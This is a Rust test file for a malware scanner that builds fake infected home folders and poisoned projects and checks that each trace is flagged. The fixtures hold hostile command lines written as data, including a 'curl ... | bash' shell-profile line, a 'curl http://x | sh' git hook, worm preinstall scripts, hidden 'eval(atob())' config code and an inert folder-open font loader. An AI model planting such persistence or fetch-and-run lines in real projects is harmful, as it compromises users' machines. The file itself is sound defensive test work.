//! End-to-end scan of a fake home folder seeded with real-world attack traces.

use std::fs;
use std::path::Path;

use super::*;
use crate::env::Os;

fn write(p: &Path, s: &str) {
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, s).unwrap();
}

fn fake_infected_home() -> (tempfile::TempDir, Env) {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), Os::Mac);
    let h = env.home.clone();
    // Malware leftovers
    fs::create_dir_all(h.join(".truffler-cache")).unwrap();
    // LaunchAgent running node from a hidden folder
    write(
        &h.join("Library/LaunchAgents/com.apple.sysupdate.plist"),
        &format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.sysupdate</string>
<key>ProgramArguments</key><array><string>/usr/local/bin/node</string><string>{}/.npl/main.js</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>"#,
            h.display()
        ),
    );
    // Shell profile injection + token
    write(
        &h.join(".zshrc"),
        "eval \"$(/opt/homebrew/bin/brew shellenv)\"\ncurl -s https://x.example/p.sh | bash\n",
    );
    write(
        &h.join(".npmrc"),
        "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123456789\n",
    );
    // Project with a worm-infected dependency and a poisoned config
    let proj = h.join("code/shop");
    write(&proj.join("package.json"), r#"{"name":"shop"}"#);
    write(
        &proj.join("node_modules/@ctrl/tinycolor/package.json"),
        r#"{"name":"@ctrl/tinycolor","version":"4.1.1"}"#,
    );
    write(
        &proj.join("node_modules/evil/package.json"),
        r#"{"name":"evil","version":"1.0.0","scripts":{"preinstall":"node setup_bun.js"}}"#,
    );
    write(&proj.join("node_modules/evil/setup_bun.js"), "//");
    write(
        &proj.join("node_modules/fine/package.json"),
        r#"{"name":"fine","version":"1.0.0","scripts":{"install":"node-gyp rebuild"}}"#,
    );
    write(
        &proj.join("tailwind.config.js"),
        &format!("module.exports = {{}};{}eval(atob('ZG9j'))", " ".repeat(500)),
    );
    write(
        &proj.join("vite.config.ts"),
        "export default { server: { port: 3000 } }",
    );
    // Git repo with a hook that pushes code
    write(
        &proj.join(".git/config"),
        "[core]\n\tbare = false\n[user]\n\temail = someone@else.com\n",
    );
    write(
        &proj.join(".git/hooks/post-commit"),
        "#!/bin/sh\ngit push -f origin HEAD >/dev/null 2>&1 &\n",
    );
    write(&proj.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\nexit 0\n");
    write(&proj.join(".github/workflows/shai-hulud-workflow.yml"), "on: push\n");
    (d, env)
}

#[test]
fn finds_everything_in_an_infected_home() {
    let (_d, env) = fake_infected_home();
    let r = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    let titles: Vec<String> = r
        .findings
        .iter()
        .map(|f| format!("{:?} {}", f.severity, f.title))
        .collect();
    let has = |needle: &str| titles.iter().any(|t| t.contains(needle));

    assert!(has("High Known malware folder: ~/.truffler-cache"), "{titles:#?}");
    assert!(has("High Suspicious startup item: com.apple.sysupdate"), "{titles:#?}");
    assert!(has("High Suspicious line in ~/.zshrc"), "{titles:#?}");
    assert!(has("Medium npm token saved in plain text"), "{titles:#?}");
    assert!(
        has("High Compromised package installed: @ctrl/tinycolor@4.1.1"),
        "{titles:#?}"
    );
    assert!(has("High Shai-Hulud worm payload in evil"), "{titles:#?}");
    assert!(has("High Worm install script in evil"), "{titles:#?}");
    assert!(has("High Suspicious code in a project config file"), "{titles:#?}");
    assert!(has("Medium Suspicious git hook"), "{titles:#?}");
    assert!(has("High Shai-Hulud GitHub workflow"), "{titles:#?}");
    assert!(!has("fine"), "normal install scripts aren't flagged: {titles:#?}");
    assert!(!titles.iter().any(|t| t.contains("vite.config")), "{titles:#?}");
    assert_eq!(
        r.findings
            .iter()
            .filter(|f| f.title.contains("Suspicious line"))
            .count(),
        1,
        "brew shellenv is fine"
    );
    assert_eq!(r.scanned_repos, 1);
    assert!(r.counts.high >= 7);
    // Sorted: High first.
    assert_eq!(r.findings[0].severity, Severity::High);
    // Tokens are masked.
    let npm = r.findings.iter().find(|f| f.title.contains("npm token")).unwrap();
    assert!(!npm.evidence.as_ref().unwrap().contains("0123456789"));
}

#[test]
fn clean_home_has_no_high_findings() {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), Os::Mac);
    write(
        &env.home.join(".zshrc"),
        "export PATH=\"$HOME/bin:$PATH\"\nsource ~/.oh-my-zsh/oh-my-zsh.sh\n",
    );
    write(&env.home.join("code/app/package.json"), r#"{"name":"app"}"#);
    write(
        &env.home.join("code/app/.git/hooks/pre-commit"),
        "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\nnpx lint-staged\n",
    );
    let r = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    assert!(
        r.findings.iter().all(|f| f.severity < Severity::Medium),
        "{:#?}",
        r.findings
    );
}

#[test]
fn quarantine_and_restore_roundtrip() {
    let (_d, env) = fake_infected_home();
    let hook = env.home.join("code/shop/.git/hooks/post-commit");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
    }
    let e = quarantine(&env, &hook, "pushes code").unwrap();
    assert!(!hook.exists());
    assert!(Path::new(&e.stored).exists());
    assert_eq!(quarantined(&env).len(), 1);
    restore(&env, &e.id).unwrap();
    assert!(hook.exists());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(fs::metadata(&hook).unwrap().permissions().mode() & 0o777, 0o755);
    }
    assert!(quarantined(&env).is_empty());
    // Outside home is refused.
    fs::create_dir_all(env.root.join("etc")).unwrap();
    assert!(quarantine(&env, &env.root.join("etc"), "x").is_err());
}

#[test]
fn scan_tree_flags_poisoned_pull_request_and_passes_clean_one() {
    let d = tempfile::tempdir().unwrap();
    let clean = d.path().join("clean");
    write(&clean.join("package.json"), r#"{"name":"ok"}"#);
    write(
        &clean.join("vite.config.ts"),
        "export default { server: { port: 1420 } }",
    );
    write(&clean.join(".github/workflows/ci.yml"), "on: pull_request\njobs: {}\n");
    let r = scan_tree(&clean, &Cancel::new());
    assert_eq!(r.counts.high, 0, "{:#?}", r.findings);
    assert!(
        r.findings.iter().all(|f| f.title != "Your git identity"),
        "machine config must not leak in"
    );

    let bad = d.path().join("bad");
    write(&bad.join("package.json"), r#"{"name":"pr"}"#);
    write(
        &bad.join("postcss.config.js"),
        &format!("module.exports = {{}};{}eval(atob('ZG9j'))", " ".repeat(400)),
    );
    write(
        &bad.join("node_modules/evil/package.json"),
        r#"{"name":"evil","version":"1.0.0","scripts":{"preinstall":"node setup_bun.js"}}"#,
    );
    write(&bad.join("node_modules/evil/setup_bun.js"), "//");
    let r = scan_tree(&bad, &Cancel::new());
    assert!(r.counts.high >= 2, "{:#?}", r.findings);
}

#[test]
fn global_hooks_path_can_be_fixed() {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), crate::env::Os::Mac);
    write(&env.home.join(".gitconfig"), "[core]\n\thooksPath = ~/.evil-hooks\n");
    write(
        &env.home.join(".evil-hooks/pre-commit"),
        "#!/bin/sh\ncurl http://x | sh\n",
    );
    let report = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    let f = report
        .findings
        .iter()
        .find(|f| f.title == "Global git hooks folder is set")
        .unwrap();
    assert_eq!(f.fix, Some(Fix::UnsetGlobalHooksPath));

    apply_fix(&env, Fix::UnsetGlobalHooksPath).unwrap();
    let after = std::fs::read_to_string(env.home.join(".gitconfig")).unwrap();
    assert!(!after.contains("hooksPath"), "{after}");
    let report = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    assert!(!report
        .findings
        .iter()
        .any(|f| f.title == "Global git hooks folder is set"));
}

#[test]
fn fixes_are_fixed_git_commands() {
    assert_eq!(
        Fix::UnsetGlobalHooksPath.git_args(),
        ["config", "--global", "--unset", "core.hooksPath"]
    );
    assert_eq!(
        Fix::UseKeychainCredentials.git_args(),
        [
            "config",
            "--global",
            "credential.helper",
            if cfg!(windows) { "manager" } else { "osxkeychain" }
        ]
    );
}

/// An inert stand-in for the loader found in a pull request (Oct 2026): the same
/// disguises (tab padding, escaped words, XOR'd numbers, loader globals) and no payload.
fn inert_loader() -> String {
    let escaped = "R['\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068']";
    let mut code = String::from("global['!']='8-&&';function y7(R,c){var n=[],o=274987^274987;");
    for i in 0..6 {
        code.push_str(&format!("o+={}^{};{escaped};", 288002 + i, 288003 + i));
    }
    code.push_str("return n.join('')}");
    format!("{}{}", "\t".repeat(260), code)
}

fn poisoned_project(root: &Path) {
    write(
        &root.join("package.json"),
        r#"{"name":"app","scripts":{"dev":"node api.js && vite","build":"node api.js && tsc --noEmit && vite build","lint":"eslint ."}}"#,
    );
    write(&root.join("api.js"), &inert_loader());
    write(&root.join("public/fonts/fa-solid-300.ttf"), &inert_loader());
    write(
        &root.join(".vscode/tasks.json"),
        r#"{
  "version": "2.0.0",
  "tasks": [{
    "label": "eslint-check",
    "type": "shell",
    "command": "node",
    "args": ["./public/fonts/fa-solid-300.ttf"],
    "presentation": { "reveal": "never", "echo": false, "close": true },
    "runOptions": { "runOn": "folderOpen" }
  }]
}"#,
    );
    write(
        &root.join(".vscode/settings.json"),
        r#"{ "task.allowAutomaticTasks": true }"#,
    );
}

#[test]
fn scan_tree_catches_the_folder_open_font_loader() {
    let d = tempfile::tempdir().unwrap();
    let bad = d.path().join("pr");
    poisoned_project(&bad);
    let r = scan_tree(&bad, &Cancel::new());
    let titles: Vec<String> = r
        .findings
        .iter()
        .map(|f| format!("{:?} {}", f.severity, f.title))
        .collect();
    let has = |needle: &str| titles.iter().any(|t| t == needle);
    assert!(has("High Editor task runs when the folder is opened"), "{titles:#?}");
    assert!(has("High Script disguised as a .ttf file"), "{titles:#?}");
    assert!(has("High Hidden code in a JavaScript file"), "{titles:#?}");
    assert!(has("High npm script \"dev\" runs hidden code"), "{titles:#?}");
    assert!(has("High npm script \"build\" runs hidden code"), "{titles:#?}");
    assert!(
        has("Medium Folder settings let tasks run without asking"),
        "{titles:#?}"
    );
    assert!(!titles.iter().any(|t| t.contains("\"lint\"")), "{titles:#?}");
    let task = r.findings.iter().find(|f| f.title.starts_with("Editor task")).unwrap();
    assert!(
        task.detail.contains("hides its terminal") && task.detail.contains(".ttf"),
        "{}",
        task.detail
    );
}

#[test]
fn ordinary_editor_tasks_fonts_and_scripts_pass() {
    let d = tempfile::tempdir().unwrap();
    let ok = d.path().join("ok");
    write(
        &ok.join("package.json"),
        r#"{"name":"ok","scripts":{"dev":"vite","gen":"node scripts/gen-icons.mjs","test":"vitest run"}}"#,
    );
    write(
        &ok.join("scripts/gen-icons.mjs"),
        "import fs from 'node:fs';\nconst names = ['a', 'b'];\nfs.writeFileSync('out.json', JSON.stringify(names));\n",
    );
    write(
        &ok.join(".vscode/tasks.json"),
        r#"{ "version": "2.0.0", "tasks": [{ "label": "dev", "type": "npm", "script": "dev" }] }"#,
    );
    write(&ok.join(".vscode/settings.json"), r#"{ "editor.formatOnSave": true }"#);
    // A real TrueType header and a real PNG header.
    let font = [
        &[0u8, 1, 0, 0, 0, 14, 0, 128, 0, 3, 0, 96][..],
        b"OS/2 function var const",
    ]
    .concat();
    fs::create_dir_all(ok.join("public/fonts")).unwrap();
    fs::write(ok.join("public/fonts/Inter.ttf"), font).unwrap();
    fs::write(ok.join("public/logo.png"), b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x10").unwrap();
    // Minified but honest code: one long line, no disguises.
    write(
        &ok.join("public/vendor.min.js"),
        &format!("!function(e){{{}}}(window);", "var a=1,b=2;".repeat(800)),
    );
    let r = scan_tree(&ok, &Cancel::new());
    assert!(
        r.findings.iter().all(|f| f.severity < Severity::Medium),
        "{:#?}",
        r.findings
    );
}

#[test]
fn global_editor_tasks_are_checked_on_the_machine_scan() {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), Os::Mac);
    write(
        &env.home.join("Library/Application Support/Cursor/User/tasks.json"),
        r#"{"tasks":[{"command":"node ~/.cache/x.woff2","runOptions":{"runOn":"folderOpen"},"presentation":{"reveal":"never"}}]}"#,
    );
    let r = scan(&env, &[], &Cancel::new());
    let f = r
        .findings
        .iter()
        .find(|f| f.title == "Editor task runs when the folder is opened")
        .unwrap();
    assert_eq!(f.severity, Severity::High);
}

#[test]
fn installed_editor_extensions_in_home_are_not_scanned() {
    let d = tempfile::tempdir().unwrap();
    let env = Env::sandboxed(d.path(), Os::Mac);
    write(
        &env.home.join(".vscode/extensions/some.ext/dist/bundle.js"),
        &inert_loader(),
    );
    let r = scan(&env, std::slice::from_ref(&env.home), &Cancel::new());
    assert!(
        !r.findings.iter().any(|f| f.title == "Hidden code in a JavaScript file"),
        "{:#?}",
        r.findings
    );
}
